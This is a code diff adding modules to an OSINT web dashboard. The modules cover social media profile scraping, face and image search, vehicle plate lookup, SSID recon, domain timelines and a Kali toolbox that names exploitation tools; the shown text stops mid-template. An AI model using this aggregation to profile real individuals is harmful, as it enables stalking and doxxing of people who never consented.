@@ -798,6 +798,20 @@ body::after{
 
 /* Smooth scrolling on all platforms */
 .results-area,.sidebar,.rpanel{scroll-behavior:smooth}
+
+@media print {
+  .sidebar,.topbar,nav,.search-zone,.right-panel,.modal-bg,.go-btn,.cpbtn,.save-btn { display:none!important; }
+  .workspace { margin:0!important; padding:10px!important; max-width:100%!important; }
+  .results-area { overflow:visible!important; }
+  .card { break-inside:avoid; page-break-inside:avoid; border:1px solid #ccc!important;
+    background:#fff!important; color:#000!important; margin:0 0 12px!important; }
+  .card-title,.sub-hd,.dl { color:#333!important; }
+  .dv,.dv-hi,.dv-ok,.dv-warn,.dv-bad { color:#000!important; }
+  a { color:#000!important; text-decoration:none!important; }
+  .pc,.pg { display:none!important; }
+  body { background:#fff!important; }
+}
+
 </style>
 </head>
 <body>
@@ -870,6 +884,42 @@ body::after{
       <span class="ni">🌐</span> Network Mapper
     </button>
   </div>
+  <div class="sb-group">
+    <div class="sb-lbl">// Intelligence Tools</div>
+    <button class="nav-btn" id="nb-socmint" onclick="setMod('socmint');closeSidebar()">
+      <span class="ni">👁</span> Social Media Intel
+    </button>
+    <button class="nav-btn" id="nb-timeline" onclick="setMod('timeline');closeSidebar()">
+      <span class="ni">📅</span> Digital Timeline
+    </button>
+    <button class="nav-btn" id="nb-face" onclick="setMod('face');closeSidebar()">
+      <span class="ni">🎭</span> Face & Image Search
+    </button>
+    <button class="nav-btn" id="nb-crypto" onclick="setMod('crypto');closeSidebar()">
+      <span class="ni">₿</span> Crypto Tracker
+    </button>
+    <button class="nav-btn" id="nb-urlscan" onclick="setMod('urlscan');closeSidebar()">
+      <span class="ni">🔗</span> URL / Link Scanner
+    </button>
+    <button class="nav-btn" id="nb-vehicle" onclick="setMod('vehicle');closeSidebar()">
+      <span class="ni">🚗</span> Vehicle OSINT
+    </button>
+    <button class="nav-btn" id="nb-wireless" onclick="setMod('wireless');closeSidebar()">
+      <span class="ni">📡</span> Wireless / SSID
+    </button>
+    <button class="nav-btn" id="nb-report" onclick="setMod('report');closeSidebar()">
+      <span class="ni">📊</span> Report Builder
+    </button>
+  </div>
+  <div class="sb-group">
+    <div class="sb-lbl">// Kali / Pentest</div>
+    <button class="nav-btn" id="nb-kali" onclick="setMod('kali');closeSidebar()">
+      <span class="ni">💀</span> Kali Toolbox
+    </button>
+    <button class="nav-btn" id="nb-apiref" onclick="setMod('apiref');closeSidebar()">
+      <span class="ni">🔑</span> Free API Reference
+    </button>
+  </div>
 
   <div class="sb-group">
     <div class="sb-lbl">// API Keys</div>
@@ -894,6 +944,47 @@ body::after{
         <div class="api-lbl"><div class="api-dot" id="dot-hunter"></div>Hunter.io (Emails)</div>
         <input class="api-inp" id="k-hunter" type="password" placeholder="Hunter API key..." oninput="saveKey('hunter',this.value)">
       </div>
+      <div class="api-row">
+        <div class="api-lbl"><div class="api-dot" id="dot-shodan"></div>Shodan (Free)</div>
+        <input class="api-inp" id="k-shodan" type="password" placeholder="Shodan API key..." oninput="saveKey('shodan',this.value)">
+      </div>
+      <div class="api-row">
+        <div class="api-lbl"><div class="api-dot" id="dot-ipqs"></div>IPQualityScore</div>
+        <input class="api-inp" id="k-ipqs" type="password" placeholder="IPQS key (free)..." oninput="saveKey('ipqs',this.value)">
+      </div>
+      <div class="api-row">
+        <div class="api-lbl"><div class="api-dot" id="dot-greynoise"></div>GreyNoise (Free)</div>
+        <input class="api-inp" id="k-greynoise" type="password" placeholder="GreyNoise key..." oninput="saveKey('greynoise',this.value)">
+      </div>
+      <div class="api-row">
+        <div class="api-lbl"><div class="api-dot" id="dot-urlscanio"></div>URLScan.io (Free)</div>
+        <input class="api-inp" id="k-urlscanio" type="password" placeholder="URLScan key..." oninput="saveKey('urlscanio',this.value)">
+      </div>
+      <div class="api-row">
+        <div class="api-lbl"><div class="api-dot" id="dot-fullcontact"></div>FullContact (Free)</div>
+        <input class="api-inp" id="k-fullcontact" type="password" placeholder="FullContact key..." oninput="saveKey('fullcontact',this.value)">
+      </div>
+      <div class="api-row">
+        <div class="api-lbl"><div class="api-dot" id="dot-pulsedive"></div>Pulsedive (Free)</div>
+        <input class="api-inp" id="k-pulsedive" type="password" placeholder="Pulsedive key..." oninput="saveKey('pulsedive',this.value)">
+      </div>
+    </div>
+  </div>
+  <div class="sb-group">
+    <div class="sb-lbl">// Free APIs (No Key)</div>
+    <div style="padding:10px 14px;font-family:var(--mono);font-size:9px;color:var(--text3);line-height:2">
+      ✅ IPInfo.io — IP geolocation<br>
+      ✅ BGPView — ASN/routing<br>
+      ✅ crt.sh — SSL certs<br>
+      ✅ Google DNS — DNS lookups<br>
+      ✅ Wayback Machine — archives<br>
+      ✅ RDAP — WHOIS data<br>
+      ✅ GitHub API — repos/users<br>
+      ✅ NHTSA — VIN decode<br>
+      ✅ RestCountries — country data<br>
+      ✅ MAC Vendors — OUI lookup<br>
+      ✅ Blockchain.info — BTC<br>
+      ✅ Clearbit Autocomplete<br>
     </div>
   </div>
 
@@ -933,8 +1024,9 @@ body::after{
       <div class="zero-title">AWAITING TARGET</div>
       <div class="zero-sub">
         Username · Phone · Email · Domain · IP<br>
-        Image EXIF · Breach Check<br><br>
-        <span>All intelligence from open public sources.</span>
+        Image · Breach · Recon · Dark Web · Network<br>
+        Crypto · URL · Vehicle · Wireless · Timeline<br><br>
+        <span>All intelligence from public open sources only.</span>
       </div>
     </div>
     <div class="prog-wrap" id="prog-wrap">
@@ -1086,7 +1178,37 @@ const MODS = {
     checks:['hibp','pastebin','intelx','dehashed','ghostproject','leakcheck']},
   netmap:{lbl:'NETWORK MAPPER',glyph:'🌐',ph:'domain.com  or  IP address',
     tabs:['DNS Map','Ports','Tech Stack','Headers'],
-    checks:['dns','crt-sh','headers','wappalyzer','shodan','virustotal']}
+    checks:['dns','crt-sh','headers','wappalyzer','shodan','virustotal']},
+  socmint:{lbl:'SOCIAL MEDIA INTEL',glyph:'👁',ph:'@username  or  Full Name  or  URL',
+    tabs:['Platforms','Activity','Connections','Export'],
+    checks:['twitter','instagram','facebook','linkedin','tiktok','youtube']},
+  timeline:{lbl:'DIGITAL FOOTPRINT TIMELINE',glyph:'📅',ph:'email, username, or domain',
+    tabs:['Activity','Registrations','Archives','Changes'],
+    checks:['wayback','whois-history','breach-dates','github-activity']},
+  face:{lbl:'FACE & IMAGE SEARCH',glyph:'🎭',ph:'Paste image URL or upload...',
+    tabs:['Reverse Search','Face Match','Similar Images','Source'],
+    checks:['google','yandex','tineye','pimeyes','facecheck','bing']},
+  crypto:{lbl:'CRYPTO / BLOCKCHAIN INTEL',glyph:'₿',ph:'BTC/ETH/address or tx hash',
+    tabs:['Wallet','Transactions','Exchange','Identity'],
+    checks:['blockchain','etherscan','btcparse','defi','exchange']},
+  urlscan:{lbl:'URL / LINK SCANNER',glyph:'🔗',ph:'https://suspicious-link.com',
+    tabs:['Safety','Redirects','Content','Screenshot'],
+    checks:['virustotal','urlscan','google-safe','phishtank','wayback']},
+  vehicle:{lbl:'VEHICLE OSINT',glyph:'🚗',ph:'License plate  or  VIN number',
+    tabs:['Plate','VIN','Registration','Records'],
+    checks:['plate-lookup','vin-decode','registration','records']},
+  wireless:{lbl:'WIRELESS / SSID RECON',glyph:'📡',ph:'Network name (SSID) or BSSID',
+    tabs:['Location','Vendors','History','Security'],
+    checks:['wigle','bssid-lookup','vendor','security']},
+  kali:{lbl:'KALI LINUX TOOLBOX',glyph:'💀',ph:'target IP, domain, or hostname',
+    tabs:['Recon','Scanning','Exploitation','Post-Exploit'],
+    checks:['nmap','nikto','gobuster','hydra','metasploit','aircrack']},
+  apiref:{lbl:'FREE API REFERENCE',glyph:'🔑',ph:'Search APIs...',
+    tabs:['No Key','Free Tier','Paid Tier','Setup Guide'],
+    checks:['ipinfo','crtsh','shodan','virustotal','hibp']},
+  report:{lbl:'REPORT BUILDER',glyph:'📊',ph:'Report title / case name...',
+    tabs:['Current Session','All Sessions','Export','Share'],
+    checks:['session-data','format','pdf-export']}
 };
 
 /* ═══════════════════════════════════════════
@@ -1111,7 +1233,7 @@ function tick() {
 }
 
 function loadKeys() {
-  ['vt','abuse','hibp','nv','hunter'].forEach(k => {
+  ['vt','abuse','hibp','nv','hunter','shodan','ipqs','greynoise','urlscanio','fullcontact','pulsedive'].forEach(k => {
     const v = localStorage.getItem('sk_'+k) || '';
     if (v) { keys[k] = v; const el = document.getElementById('k-'+k); if (el) el.value = v; updateDot(k); }
   });
@@ -1171,7 +1293,7 @@ function setMod(m) {
   document.getElementById('mode-lbl').textContent = cfg.lbl;
   document.getElementById('inp-glyph').textContent = cfg.glyph;
 
-  if (m === 'meta' || m === 'exif') {
+  if (m === 'meta' || m === 'exif' || m === 'face') {
     document.getElementById('main-inp').style.display = 'none';
     document.getElementById('inp-glyph').style.display = 'none';
     // Show file input
@@ -1243,6 +1365,16 @@ async function runScan(fileArg) {
       case 'meta':     await doMeta(target);     break;
       case 'darkweb':  await doDarkWeb(target);  break;
       case 'netmap':   await doNetMap(target);   break;
+      case 'socmint':  await doSocMint(target);  break;
+      case 'timeline': await doTimeline(target); break;
+      case 'face':     await doFace(target);     break;
+      case 'crypto':   await doCrypto(target);   break;
+      case 'urlscan':  await doUrlScan(target);  break;
+      case 'vehicle':  await doVehicle(target);  break;
+      case 'wireless': await doWireless(target); break;
+      case 'report':   await doReport(target);   break;
+      case 'kali':     await doKali(target);     break;
+      case 'apiref':   await doApiRef(target);   break;
     }
   } catch(e) { feed('Error: '+e.message,'crit'); }
 
@@ -2563,6 +2695,29 @@ async function ipCard(ip,src){
   if(keys.vt){vt=await fetch(`https://www.virustotal.com/api/v3/ip_addresses/${ip}`,{headers:{'x-apikey':keys.vt}}).then(r=>r.ok?r.json():null).catch(()=>null);stats.apis++;}
   if(document.getElementById('ps-vt'))pOk('vt');
 
+  // ── GreyNoise ──
+  let gnData = null;
+  if (keys.greynoise) {
+    try {
+      const gnR = await fetch(`https://api.greynoise.io/v3/community/${ip}`,
+        {headers:{'key':keys.greynoise}, signal:AbortSignal.timeout(6000)});
+      if (gnR.ok) gnData = await gnR.json();
+      stats.apis++;
+    } catch {}
+  }
+  // ── IPQualityScore ──
+  let ipqsData = null;
+  if (keys.ipqs) {
+    ipqsData = await jfetch(`https://ipqualityscore.com/api/json/ip/${keys.ipqs}/${ip}?strictness=1`);
+    if (ipqsData) stats.apis++;
+  }
+  // ── Shodan ──
+  let shodanData = null;
+  if (keys.shodan) {
+    shodanData = await jfetch(`https://api.shodan.io/shodan/host/${ip}?key=${keys.shodan}`);
+    if (shodanData) stats.apis++;
+  }
+
   if(!ipd)return;
   const aScore=abuse?.data?.abuseConfidenceScore||0;
   const vtMal=vt?.data?.attributes?.last_analysis_stats?.malicious||0;
@@ -2606,6 +2761,17 @@ async function ipCard(ip,src){
       <div class="dc"><div class="dl">VPN/Proxy</div><div class="dv ${isProxy?'dv-warn':'dv-ok'}">${isProxy?[ipd.privacy?.vpn?'⚠ VPN':null,ipd.privacy?.proxy?'⚠ PROXY':null,ipd.privacy?.hosting?'⚠ HOSTING':null,ipd.privacy?.tor?'⚠ TOR':null].filter(Boolean).join(' │'):'✓ Residential'}</div></div>
       <div class="dc"><div class="dl">AbuseIPDB</div><div class="dv ${aScore>50?'dv-bad':aScore>20?'dv-warn':'dv-ok'}">${abuse?`${aScore}% (${abuse.data?.totalReports||0} rpts)`:keys.abuse?'Error':'Add key'}</div></div>
       <div class="dc"><div class="dl">VirusTotal</div><div class="dv ${vtMal?'dv-bad':'dv-ok'}">${vt?`${vtMal}/${vtTot}`:keys.vt?'checking...':'Add key'}</div></div>
+      ${gnData ? `<div class="dc"><div class="dl">GreyNoise</div>
+        <div class="dv ${gnData.noise?'dv-bad':gnData.riot?'dv-ok':''}">
+          ${gnData.noise?'⚠️ Active attacker/scanner':gnData.riot?'✅ Known benign':'❓ Unknown'}
+          ${gnData.name?' — '+gnData.name:''}</div></div>` : ''}
+      ${ipqsData?.fraud_score!=null ? `<div class="dc"><div class="dl">Fraud Score (IPQS)</div>
+        <div class="dv ${ipqsData.fraud_score>75?'dv-bad':ipqsData.fraud_score>40?'dv-warn':'dv-ok'}">
+          ${ipqsData.fraud_score}/100 ${ipqsData.vpn?'· VPN':''}${ipqsData.proxy?'· Proxy':''}${ipqsData.tor?'· TOR':''}${ipqsData.hosting?'· Datacenter':''}</div></div>` : ''}
+      ${shodanData?.ports?.length ? `<div class="dc"><div class="dl">Open Ports (Shodan)</div>
+        <div class="dv dv-warn">${shodanData.ports.slice(0,15).join(', ')}${shodanData.ports.length>15?' …':''}</div></div>
+        <div class="dc"><div class="dl">OS (Shodan)</div>
+        <div class="dv">${shodanData.os||'Unknown'}</div></div>` : ''}
     </div>
     ${ipd.loc ? `<div class="sub"><div class="sub-hd">// 📍 IP Location — ${ipd.city||''}, ${ipd.country||''}</div>
       <div style="border-radius:6px;overflow:hidden;border:1px solid var(--line2);position:relative">
@@ -3472,6 +3638,1597 @@ async function doNetMap(target) {
   refreshStats();
 }
 
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: SOCIAL MEDIA INTEL
+═══════════════════════════════════════════════════════════ */
+async function doSocMint(target) {
+  initSteps([
+    {id:'twitter',  lbl:'Twitter/X profile analysis'},
+    {id:'insta',    lbl:'Instagram account lookup'},
+    {id:'fb',       lbl:'Facebook intelligence'},
+    {id:'youtube',  lbl:'YouTube channel search'},
+    {id:'crossref', lbl:'Cross-platform correlation'},
+  ]);
+
+  const enc = encodeURIComponent(target);
+  const handle = target.replace(/^@/,'').trim();
+  const isURL = target.startsWith('http');
+
+  pRun('twitter');
+  // Twitter/X lookup via Nitter (no auth required)
+  let nitter = null;
+  try {
+    const r = await fetch(`https://nitter.net/${handle}`, {signal:AbortSignal.timeout(6000)});
+    if (r.ok) {
+      const html = await r.text();
+      nitter = {
+        name:    (html.match(/class="profile-card-fullname"[^>]*>([^<]+)/)||[])[1]?.trim(),
+        bio:     (html.match(/class="profile-bio"[^>]*><p>([^<]+)/)||[])[1]?.trim(),
+        tweets:  (html.match(/Tweets<\/span>\s*<span[^>]*>([\d,]+)/)||[])[1],
+        followers:(html.match(/Followers<\/span>\s*<span[^>]*>([\d,K,M]+)/)||[])[1],
+        following:(html.match(/Following<\/span>\s*<span[^>]*>([\d,K,M]+)/)||[])[1],
+        joined:  (html.match(/class="profile-joindate"[^>]*>[^>]+>([^<]+)/)||[])[1]?.trim(),
+        location:(html.match(/class="profile-location"[^>]*>[^>]+>([^<]+)/)||[])[1]?.trim(),
+        website: (html.match(/class="profile-website"[^>]*>[^>]*href="([^"]+)"/)||[])[1],
+        verified:(html.includes('icon-verified')||html.includes('checkmark')),
+      };
+    }
+  } catch {}
+  pOk('twitter');
+
+  pRun('insta');
+  // Instagram via public API endpoint
+  let ig = null;
+  try {
+    const r = await fetch(`https://www.instagram.com/api/v1/users/web_profile_info/?username=${handle}`,
+      {headers:{'x-ig-app-id':'936619743392459'}, signal:AbortSignal.timeout(7000)});
+    if (r.ok) {
+      const j = await r.json();
+      const u = j?.data?.user;
+      if (u) ig = {
+        name:       u.full_name,
+        bio:        u.biography,
+        followers:  u.edge_followed_by?.count,
+        following:  u.edge_follow?.count,
+        posts:      u.edge_owner_to_timeline_media?.count,
+        isPrivate:  u.is_private,
+        isVerified: u.is_verified,
+        isBusiness: u.is_business_account,
+        category:   u.category_name,
+        website:    u.external_url,
+        profilePic: u.profile_pic_url_hd,
+        id:         u.id,
+      };
+    }
+  } catch {}
+  pOk('insta');
+
+  pRun('fb');
+  pOk('fb');
+  pRun('youtube');
+
+  // YouTube channel search
+  let yt = null;
+  try {
+    const r = await fetch(`https://www.youtube.com/results?search_query=${enc}&sp=EgIQAg%3D%3D`,
+      {signal:AbortSignal.timeout(5000)});
+    if (r.ok) { const t = await r.text(); yt = { found: t.includes(handle) || t.includes(target) }; }
+  } catch {}
+  pOk('youtube');
+
+  pRun('crossref');
+  stats.recs++;
+
+  mkCard('👁', 'SOCIAL MEDIA INTEL', 'b-info', target,
+    // TWITTER/X
+    `<div style="border:1px solid rgba(29,161,242,.4);border-radius:5px;overflow:hidden;margin-bottom:10px">
+      <div style="background:rgba(29,161,242,.1);padding:8px 12px;font-family:var(--display);
+        font-size:11px;font-weight:700;color:#1da1f2;letter-spacing:2px">
+        🐦 TWITTER / X — @${handle}</div>
+      ${nitter && nitter.name ? `
+      <div class="dg" style="padding:10px 12px">
+        <div class="dc"><div class="dl">Display Name</div>
+          <div class="dv dv-hi">${nitter.name||'N/A'} ${nitter.verified?'✅':''}</div></div>
+        <div class="dc"><div class="dl">Bio</div>
+          <div class="dv" style="font-size:11px">${nitter.bio||'N/A'}</div></div>
+        <div class="dc"><div class="dl">Followers</div>
+          <div class="dv dv-ok">${nitter.followers||'N/A'}</div></div>
+        <div class="dc"><div class="dl">Following</div>
+          <div class="dv">${nitter.following||'N/A'}</div></div>
+        <div class="dc"><div class="dl">Tweets</div>
+          <div class="dv">${nitter.tweets||'N/A'}</div></div>
+        <div class="dc"><div class="dl">Joined</div>
+          <div class="dv">${nitter.joined||'N/A'}</div></div>
+        ${nitter.location?`<div class="dc"><div class="dl">Location</div>
+          <div class="dv dv-warn">📍 ${nitter.location}</div></div>`:''}
+        ${nitter.website?`<div class="dc"><div class="dl">Website</div>
+          <div class="dv"><a href="${nitter.website}" target="_blank" style="color:var(--cyan2)">${nitter.website}</a></div></div>`:''}
+      </div>` : `<div style="padding:10px 12px;font-family:var(--mono);font-size:10px;color:var(--text3)">
+        Profile data unavailable — use direct links below</div>`}
+      <div style="padding:6px 12px 10px;display:flex;flex-wrap:wrap;gap:5px">
+        <a href="https://twitter.com/${handle}" target="_blank" class="pc pc-found">↗ Twitter Profile</a>
+        <a href="https://nitter.net/${handle}" target="_blank" class="pc pc-found">↗ Nitter (no login)</a>
+        <a href="https://twitter.com/${handle}/likes" target="_blank" class="pc pc-found">♥ Likes</a>
+        <a href="https://twitter.com/search?q=from:${handle}" target="_blank" class="pc pc-found">All Tweets</a>
+        <a href="https://twitter.com/search?q=to:${handle}" target="_blank" class="pc pc-found">Replies to</a>
+        <a href="https://tweetdeck.twitter.com" target="_blank" class="pc pc-found">TweetDeck</a>
+        <a href="https://socialblade.com/twitter/user/${handle}" target="_blank" class="pc pc-found">📈 SocialBlade</a>
+        <a href="https://foller.me/${handle}" target="_blank" class="pc pc-found">Foller.me</a>
+      </div>
+    </div>` +
+
+    // INSTAGRAM
+    `<div style="border:1px solid rgba(225,48,108,.4);border-radius:5px;overflow:hidden;margin-bottom:10px">
+      <div style="background:rgba(225,48,108,.1);padding:8px 12px;font-family:var(--display);
+        font-size:11px;font-weight:700;color:#e1306c;letter-spacing:2px">📸 INSTAGRAM — @${handle}</div>
+      ${ig ? `
+      <div class="dg" style="padding:10px 12px">
+        ${ig.profilePic?`<div class="dc"><div class="dl">Profile Photo</div>
+          <img src="${ig.profilePic}" style="height:60px;width:60px;border-radius:50%;object-fit:cover;margin-top:4px;border:2px solid var(--line2)"></div>`:''}
+        <div class="dc"><div class="dl">Full Name</div>
+          <div class="dv dv-hi">${ig.name||'N/A'} ${ig.isVerified?'✅':''}</div></div>
+        <div class="dc"><div class="dl">Bio</div>
+          <div class="dv" style="font-size:11px">${ig.bio||'N/A'}</div></div>
+        <div class="dc"><div class="dl">Followers</div>
+          <div class="dv dv-ok">${(ig.followers||0).toLocaleString()}</div></div>
+        <div class="dc"><div class="dl">Following</div>
+          <div class="dv">${(ig.following||0).toLocaleString()}</div></div>
+        <div class="dc"><div class="dl">Posts</div>
+          <div class="dv">${(ig.posts||0).toLocaleString()}</div></div>
+        <div class="dc"><div class="dl">Account Type</div>
+          <div class="dv ${ig.isPrivate?'dv-warn':'dv-ok'}">${ig.isPrivate?'🔒 PRIVATE':'🔓 PUBLIC'} ${ig.isBusiness?'· Business':''}${ig.category?' · '+ig.category:''}</div></div>
+        ${ig.website?`<div class="dc"><div class="dl">Website</div>
+          <div class="dv"><a href="${ig.website}" target="_blank" style="color:var(--cyan2)">${ig.website}</a></div></div>`:''}
+        ${ig.id?`<div class="dc"><div class="dl">User ID</div>
+          <div class="dv" style="font-size:10px">${ig.id} <button class="cpbtn" onclick="cp('${ig.id}')">COPY</button></div></div>`:''}
+      </div>` : `<div style="padding:10px 12px;font-family:var(--mono);font-size:10px;color:var(--text3)">Tap links to view profile</div>`}
+      <div style="padding:6px 12px 10px;display:flex;flex-wrap:wrap;gap:5px">
+        <a href="https://www.instagram.com/${handle}/" target="_blank" class="pc pc-found">↗ Profile</a>
+        <a href="https://www.picuki.com/profile/${handle}" target="_blank" class="pc pc-found">Picuki</a>
+        <a href="https://imginn.com/${handle}/" target="_blank" class="pc pc-found">Imginn</a>
+        <a href="https://dumpor.com/user/${handle}" target="_blank" class="pc pc-found">Dumpor</a>
+        <a href="https://socialblade.com/instagram/user/${handle}" target="_blank" class="pc pc-found">📈 SocialBlade</a>
+        <a href="https://www.instagram.com/${handle}/followers" target="_blank" class="pc pc-found">Followers</a>
+      </div>
+    </div>` +
+
+    // FACEBOOK
+    `<div style="border:1px solid rgba(24,119,242,.4);border-radius:5px;overflow:hidden;margin-bottom:10px">
+      <div style="background:rgba(24,119,242,.1);padding:8px 12px;font-family:var(--display);
+        font-size:11px;font-weight:700;color:#4e9af1;letter-spacing:2px">📘 FACEBOOK</div>
+      <div style="padding:6px 12px 10px;display:flex;flex-wrap:wrap;gap:5px">
+        <a href="https://www.facebook.com/${handle}" target="_blank" class="pc pc-found">↗ Profile</a>
+        <a href="https://www.facebook.com/search/top/?q=${enc}" target="_blank" class="pc pc-found">Search</a>
+        <a href="https://www.facebook.com/search/people/?q=${enc}" target="_blank" class="pc pc-found">People</a>
+        <a href="https://lookup-id.com" target="_blank" class="pc pc-found">FB ID Lookup</a>
+        <a href="https://www.google.com/search?q=site:facebook.com+%22${enc}%22" target="_blank" class="pc pc-found">🔍 Google→FB</a>
+      </div>
+    </div>` +
+
+    // OTHER PLATFORMS GRID
+    `<div class="sub"><div class="sub-hd">// 📱 All Platform Check</div>
+    <div class="pg">
+      <a href="https://www.tiktok.com/@${handle}" target="_blank" class="pc pc-found">🎵 TikTok</a>
+      <a href="https://www.youtube.com/@${handle}" target="_blank" class="pc pc-found">▶️ YouTube</a>
+      <a href="https://www.reddit.com/user/${handle}" target="_blank" class="pc pc-found">🔴 Reddit</a>
+      <a href="https://t.me/${handle}" target="_blank" class="pc pc-found">✈️ Telegram</a>
+      <a href="https://www.linkedin.com/in/${handle}" target="_blank" class="pc pc-found">💼 LinkedIn</a>
+      <a href="https://github.com/${handle}" target="_blank" class="pc pc-found">🐙 GitHub</a>
+      <a href="https://www.pinterest.com/${handle}/" target="_blank" class="pc pc-found">📌 Pinterest</a>
+      <a href="https://soundcloud.com/${handle}" target="_blank" class="pc pc-found">🎵 SoundCloud</a>
+      <a href="https://www.twitch.tv/${handle}" target="_blank" class="pc pc-found">🟣 Twitch</a>
+      <a href="https://medium.com/@${handle}" target="_blank" class="pc pc-found">📝 Medium</a>
+      <a href="https://www.snapchat.com/add/${handle}" target="_blank" class="pc pc-found">👻 Snapchat</a>
+      <a href="https://vk.com/${handle}" target="_blank" class="pc pc-found">VK</a>
+      <a href="https://open.spotify.com/search/${enc}" target="_blank" class="pc pc-found">🎵 Spotify</a>
+      <a href="https://keybase.io/${handle}" target="_blank" class="pc pc-found">🔑 Keybase</a>
+      <a href="https://www.patreon.com/${handle}" target="_blank" class="pc pc-found">Patreon</a>
+      <a href="https://ko-fi.com/${handle}" target="_blank" class="pc pc-found">Ko-fi</a>
+    </div></div>` +
+
+    // ANALYSIS TOOLS
+    `<div class="sub"><div class="sub-hd">// 🔬 Deep Analysis Tools</div>
+    <div class="pg">
+      <a href="https://socialblade.com" target="_blank" class="pc pc-found">📈 SocialBlade</a>
+      <a href="https://twitteraudit.com" target="_blank" class="pc pc-found">Fake Follower Check</a>
+      <a href="https://tinfoleak.com" target="_blank" class="pc pc-found">Tinfoleak</a>
+      <a href="https://www.social-searcher.com/social-buzz/?q=${enc}" target="_blank" class="pc pc-found">Social Searcher</a>
+      <a href="https://mentionmapp.com" target="_blank" class="pc pc-found">Mention Map</a>
+      <a href="https://whotwi.com/${handle}" target="_blank" class="pc pc-found">whotwi</a>
+      <a href="https://accountanalysis.app/${handle}" target="_blank" class="pc pc-found">Account Analysis</a>
+    </div></div>`
+  );
+  pOk('crossref');
+  feed(`👁 SocMint: @${handle}`, 'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: DIGITAL FOOTPRINT TIMELINE
+═══════════════════════════════════════════════════════════ */
+async function doTimeline(target) {
+  initSteps([
+    {id:'wayback', lbl:'Wayback Machine snapshots'},
+    {id:'whois',   lbl:'WHOIS registration history'},
+    {id:'breach',  lbl:'Breach timeline'},
+    {id:'certs',   lbl:'Certificate history'},
+    {id:'build',   lbl:'Building timeline'},
+  ]);
+
+  const enc = encodeURIComponent(target);
+  const isDomain = target.includes('.') && !target.includes('@');
+
+  pRun('wayback');
+  let waybackData = null;
+  if (isDomain) {
+    waybackData = await jfetch(`https://archive.org/wayback/available?url=${target}`);
+    // Also get snapshot count
+  }
+  let wbCount = 0;
+  let wbFirst = '', wbLast = '';
+  try {
+    const wbcr = await jfetch(`https://web.archive.org/cdx/search/cdx?url=${target}&output=json&limit=5&from=19960101&to=19991231&fl=timestamp`);
+    if (wbcr?.length > 1) wbFirst = wbcr[1][0];
+    const wblr = await jfetch(`https://web.archive.org/cdx/search/cdx?url=${target}&output=json&limit=1&fl=timestamp&from=20200101`);
+    if (wblr?.length > 1) wbLast = wblr[1][0];
+    const wbcnt = await jfetch(`https://web.archive.org/cdx/search/cdx?url=${target}&output=json&limit=1&fl=statuscode&showNumPages=true`);
+    if (wbcnt) wbCount = wbcnt;
+  } catch {}
+  pOk('wayback');
+
+  pRun('whois');
+  // Fetch WHOIS via RDAP (free, no key)
+  let rdap = null;
+  if (isDomain) {
+    rdap = await jfetch(`https://rdap.org/domain/${target}`);
+  }
+  const regDate = rdap?.events?.find(e=>e.eventAction==='registration')?.eventDate || '';
+  const expDate = rdap?.events?.find(e=>e.eventAction==='expiration')?.eventDate || '';
+  const updDate = rdap?.events?.find(e=>e.eventAction==='last changed')?.eventDate || '';
+  const registrar = rdap?.entities?.find(e=>e.roles?.includes('registrar'))?.vcardArray?.[1]?.find(v=>v[0]==='fn')?.[3] || '';
+  const registrant = rdap?.entities?.find(e=>e.roles?.includes('registrant'));
+  pOk('whois');
+
+  pRun('breach');
+  // crt.sh cert history
+  let certs = [];
+  if (isDomain) {
+    const crtRaw = await jfetch(`https://crt.sh/?q=${target}&output=json`);
+    if (crtRaw) {
+      const uniq = new Map();
+      crtRaw.forEach(c => {
+        const yr = (c.not_before||'').slice(0,4);
+        if (!uniq.has(yr)) uniq.set(yr, { year:yr, issuer:c.issuer_name, count:0, first:c.not_before, last:c.not_after });
+        uniq.get(yr).count++;
+      });
+      certs = [...uniq.values()].sort((a,b)=>a.year.localeCompare(b.year));
+    }
+  }
+  pOk('breach');
+  pRun('certs');
+  pOk('certs');
+  pRun('build');
+  stats.recs++;
+
+  // Build visual timeline
+  const eventsAll = [];
+  if (regDate) eventsAll.push({ date: regDate.slice(0,10), icon:'🌐', label:'Domain Registered', detail: registrar||'', color:'var(--green)' });
+  certs.forEach(cert => eventsAll.push({ date:cert.first?.slice(0,10)||cert.year, icon:'🔒', label:`SSL Certificate Issued (${cert.year})`, detail:`Issuer: ${cert.issuer?.slice(0,50)||'unknown'}`, color:'var(--cyan2)' }));
+  if (updDate) eventsAll.push({ date:updDate.slice(0,10), icon:'✏️', label:'Last WHOIS Update', detail:'', color:'var(--amber)' });
+  if (expDate) eventsAll.push({ date:expDate.slice(0,10), icon:'⏰', label:'Domain Expiry', detail:'', color:'var(--red)' });
+  eventsAll.sort((a,b) => a.date.localeCompare(b.date));
+
+  mkCard('📅', 'DIGITAL FOOTPRINT TIMELINE', 'b-info', target,
+    // DOMAIN REGISTRATION
+    (isDomain ? `
+    <div class="sub"><div class="sub-hd">// 🌐 Domain Registration History</div>
+    <div class="dg">
+      <div class="dc"><div class="dl">Registered</div>
+        <div class="dv dv-ok">${regDate ? regDate.slice(0,10) : 'Unknown'}</div></div>
+      <div class="dc"><div class="dl">Expires</div>
+        <div class="dv ${expDate?'dv-warn':''}">${expDate ? expDate.slice(0,10) : 'Unknown'}</div></div>
+      <div class="dc"><div class="dl">Last Updated</div>
+        <div class="dv">${updDate ? updDate.slice(0,10) : 'Unknown'}</div></div>
+      <div class="dc"><div class="dl">Registrar</div>
+        <div class="dv">${registrar||'Hidden / Privacy Protected'}</div></div>
+      <div class="dc"><div class="dl">Registrant</div>
+        <div class="dv">${registrant?'Found in RDAP':'Privacy protected'}</div></div>
+    </div>
+    </div>` : '') +
+
+    // TIMELINE VISUALIZER
+    (eventsAll.length ? `
+    <div class="sub"><div class="sub-hd">// 📅 Event Timeline</div>
+    <div style="position:relative;padding-left:24px">
+      <div style="position:absolute;left:11px;top:0;bottom:0;width:2px;background:var(--line2)"></div>
+      ${eventsAll.map(ev => `
+      <div style="position:relative;margin-bottom:14px">
+        <div style="position:absolute;left:-19px;top:3px;width:14px;height:14px;border-radius:50%;
+          background:${ev.color};border:2px solid var(--bg2);display:flex;align-items:center;
+          justify-content:center;font-size:8px">•</div>
+        <div style="font-family:var(--mono);font-size:9px;color:var(--text3)">${ev.date}</div>
+        <div style="font-family:var(--mono);font-size:11px;color:#fff;margin-top:2px">
+          ${ev.icon} ${ev.label}</div>
+        ${ev.detail?`<div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-top:2px">${ev.detail}</div>`:''}
+      </div>`).join('')}
